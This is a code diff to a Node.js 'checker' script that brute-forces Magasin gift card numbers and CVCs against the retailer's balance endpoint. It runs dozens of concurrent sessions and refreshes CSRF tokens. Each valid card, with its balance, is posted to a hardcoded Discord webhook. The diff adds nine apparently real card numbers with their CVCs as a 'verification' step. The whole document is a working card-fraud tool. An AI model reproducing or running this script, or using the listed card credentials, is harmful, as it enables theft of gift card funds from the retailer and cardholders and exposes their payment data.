@@ -1,4 +1,4 @@
-// node maga.js — Railway headless, no menu, Discord progress updates
+// node maga.js — Railway headless, known cards first for verification
 
 const https = require('https');
 const zlib  = require('zlib');
@@ -14,12 +14,26 @@ const agent = new https.Agent({
 // ── CONFIG ─────────────────────────────────────────────────────────────
 const WEBHOOK          = "https://discord.com/api/webhooks/1498901716811124836/VCrh2UqoiOEtM2CUSMvZjp3Y9jwDNpwZ9FiLAaoTYxz8TgSQVCQ34BO8s7O_fz8b3XlK";
 const CARD_PREFIXES    = ["303940", "303920"];
-const START_SUFFIX     = 8500;
-const END_SUFFIX       = 9999;
 const CARD_CONCURRENCY = 25;
 const CVC_CONCURRENCY  = 12;
 const CSRF_TTL_MS      = 25 * 60 * 1000;
 const PROGRESS_MS      = 10 * 60 * 1000;
+
+// ── KNOWN REAL CARDS — checked first for verification ──────────────────
+const KNOWN_CARDS = [
+  { number: '3039409388', cvc: '531' },
+  { number: '3039409623', cvc: '622' },
+  { number: '3039409784', cvc: '318' },
+  { number: '3039409896', cvc: '142' },
+  { number: '3039209013', cvc: '623' },
+  { number: '3039209011', cvc: '551' },
+  { number: '3039208936', cvc: '374' },
+  { number: '3039208790', cvc: '449' },
+  { number: '3039208686', cvc: '854' },
+];
+
+// ── KNOWN SUFFIXES — hit these first in main sweep ─────────────────────
+const KNOWN_SUFFIXES = new Set([9388, 9623, 9784, 9896, 9013, 9011, 8936, 8790, 8686]);
 
 // ── SESSION POOL ───────────────────────────────────────────────────────
 const sessions = Array.from({ length: CARD_CONCURRENCY }, () => ({
@@ -54,7 +68,7 @@ function httpRequest(options, body = null) {
   });
 }
 
-// ── DISCORD — raw https, no fetch ─────────────────────────────────────
+// ── DISCORD ────────────────────────────────────────────────────────────
 function discordPost(payload) {
   return new Promise((resolve) => {
     const body = JSON.stringify(payload);
@@ -69,10 +83,7 @@ function discordPost(payload) {
         'User-Agent':     'MagasinChecker/1.0',
       },
       timeout: 8000,
-    }, (res) => {
-      res.resume();
-      resolve(res.statusCode);
-    });
+    }, (res) => { res.resume(); resolve(res.statusCode); });
     req.on('error',   () => resolve(0));
     req.on('timeout', () => { req.destroy(); resolve(0); });
     req.write(body);
@@ -166,19 +177,19 @@ async function checkCard(cardNumber, cvc, slot) {
     const balance = parseFloat((json.balance || '0').replace(/[^\d.,]/g, '').replace(',', '.')) || 0;
     const csrfExp = !!(json.error && typeof json.error === 'string' && json.error.toLowerCase().includes('csrf'));
     const valid   = json.success === true;
-    return { balance, status: res.status, csrfExpired: csrfExp, valid };
+    return { balance, status: res.status, csrfExpired: csrfExp, valid, raw: res.body.slice(0, 200) };
   } catch {
-    return { balance: 0, status: res.status, csrfExpired: false, valid: false };
+    return { balance: 0, status: res.status, csrfExpired: false, valid: false, raw: res.body.slice(0, 200) };
   }
 }
 
-// ── DISCORD — hit alert ────────────────────────────────────────────────
-async function sendHit(cardNumber, cvc, balance) {
+// ── DISCORD — hit/valid alert ──────────────────────────────────────────
+async function sendHit(cardNumber, cvc, balance, label = '') {
   await discordPost({
     embeds: [{
       title: balance > 0
         ? '💳 HIT — Magasin Gavekort med saldo!'
-        : '✅ Valid card — 0 balance',
+        : `✅ Valid card — 0 balance${label ? ' ' + label : ''}`,
       color: balance > 0 ? 0x00ff88 : 0xcc00ff,
       fields: [
         { name: 'Kortnummer', value: cardNumber,          inline: true },
@@ -191,7 +202,7 @@ async function sendHit(cardNumber, cvc, balance) {
   });
 }
 
-// ── DISCORD — progress ping ────────────────────────────────────────────
+// ── DISCORD — progress ─────────────────────────────────────────────────
 async function sendProgress(stats, cardCursor, totalCards, totalChks) {
   const elapsed = (Date.now() - stats.start) / 1000;
   const rate    = (stats.checked / Math.max(1, elapsed)).toFixed(0);
@@ -233,13 +244,24 @@ function buildCVCList() {
 
 const CVC_LIST = buildCVCList();
 
-// ── CARD LIST ──────────────────────────────────────────────────────────
+// ── CARD LIST — known suffixes first, then full range ──────────────────
 function buildCardList() {
   const cards = [];
-  for (let suffix = START_SUFFIX; suffix <= END_SUFFIX; suffix++) {
+
+  // known valid suffixes first — verification sweep
+  const knownSuffixList = [9388, 9623, 9784, 9896, 9013, 9011, 8936, 8790, 8686];
+  for (const suffix of knownSuffixList) {
     const s = suffix.toString().padStart(4, '0');
     for (const prefix of CARD_PREFIXES) cards.push(prefix + s);
   }
+
+  // then full range, skipping known (already covered)
+  for (let suffix = 8686; suffix <= 9999; suffix++) {
+    if (KNOWN_SUFFIXES.has(suffix)) continue;
+    const s = suffix.toString().padStart(4, '0');
+    for (const prefix of CARD_PREFIXES) cards.push(prefix + s);
+  }
+
   return cards;
 }
 
@@ -282,6 +304,54 @@ async function sweepCard(cardNumber, slot, stats) {
   return hits;
 }
 
+// ── VERIFICATION — check known cards with exact CVCs first ─────────────
+async function verifyKnownCards() {
+  console.log(`[VERIFY] Checking ${KNOWN_CARDS.length} known cards with exact CVCs...`);
+
+  await discordPost({
+    embeds: [{
+      title: '🔍 Verification Starting',
+      color: 0xffa500,
+      description: `Checking ${KNOWN_CARDS.length} known real cards to confirm checker is working.`,
+      footer:    { text: 'Magasin Checker • Railway' },
+      timestamp: new Date().toISOString(),
+    }]
+  });
+
+  let passed = 0;
+  let failed = 0;
+
+  for (const card of KNOWN_CARDS) {
+    await refreshSession(0);
+    const result = await checkCard(card.number, card.cvc, 0);
+    const status = result.valid ? '✅ VALID' : result.status === 0 ? '❌ NO CONN' : `❌ INVALID (${result.status})`;
+    console.log(`[VERIFY] ${card.number} / ${card.cvc} → ${status} | raw: ${result.raw}`);
+
+    if (result.valid) {
+      passed++;
+      await sendHit(card.number, card.cvc, result.balance, '(verification)');
+    } else {
+      failed++;
+    }
+  }
+
+  console.log(`[VERIFY] Done. ${passed} passed, ${failed} failed.`);
+
+  await discordPost({
+    embeds: [{
+      title: passed > 0 ? '✅ Verification Passed' : '❌ Verification Failed',
+      color: passed > 0 ? 0x00ff88 : 0xff0000,
+      description: passed > 0
+        ? `${passed}/${KNOWN_CARDS.length} known cards confirmed valid. Checker is working. Starting full sweep.`
+        : `0/${KNOWN_CARDS.length} known cards returned valid. API may be broken or CSRF expired. Check logs.`,
+      footer:    { text: 'Magasin Checker • Railway' },
+      timestamp: new Date().toISOString(),
+    }]
+  });
+
+  return passed > 0;
+}
+
 // ── MAIN ───────────────────────────────────────────────────────────────
 async function main() {
   const cardList   = buildCardList();
@@ -293,21 +363,26 @@ async function main() {
   console.log(`[INFO] Booting ${CARD_CONCURRENCY} sessions...`);
 
   await Promise.all(sessions.map((_, i) => refreshSession(i, true)));
-  console.log(`[INFO] All sessions live. Sweeping.`);
+  console.log(`[INFO] All sessions live.`);
 
   await discordPost({
     embeds: [{
       title: '🚀 Checker Started',
       color: 0x5865f2,
       fields: [
-        { name: 'Cards',        value: totalCards.toLocaleString(),              inline: true },
-        { name: 'Total checks', value: totalChks.toLocaleString(),               inline: true },
-        { name: 'Concurrency',  value: `${CARD_CONCURRENCY * CVC_CONCURRENCY}`,  inline: true },
+        { name: 'Cards',        value: totalCards.toLocaleString(),             inline: true },
+        { name: 'Total checks', value: totalChks.toLocaleString(),              inline: true },
+        { name: 'Concurrency',  value: `${CARD_CONCURRENCY * CVC_CONCURRENCY}`, inline: true },
       ],
       footer:    { text: 'Magasin Checker • Railway' },
       timestamp: new Date().toISOString(),
     }]
   });
+
+  // run verification first — if 0 pass, still sweep but Discord warned
+  await verifyKnownCards();
+
+  console.log(`[INFO] Starting full sweep.`);
 
   const stats    = { checked: 0, valid: 0, hits: 0, start: Date.now() };
   let cardCursor = 0;
@@ -351,10 +426,10 @@ async function main() {
       title: '✅ Sweep Complete',
       color: 0x00ff88,
       fields: [
-        { name: 'Checked', value: stats.checked.toLocaleString(),                                    inline: true },
-        { name: 'Valid',   value: String(stats.valid),                                               inline: true },
-        { name: 'Hits',    value: String(stats.hits),                                                inline: true },
-        { name: 'Time',    value: `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`,  inline: true },
+        { name: 'Checked', value: stats.checked.toLocaleString(),                                   inline: true },
+        { name: 'Valid',   value: String(stats.valid),                                              inline: true },
+        { name: 'Hits',    value: String(stats.hits),                                               inline: true },
+        { name: 'Time',    value: `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`, inline: true },
       ],
       footer:    { text: 'Magasin Checker • Railway' },
       timestamp: new Date().toISOString(),
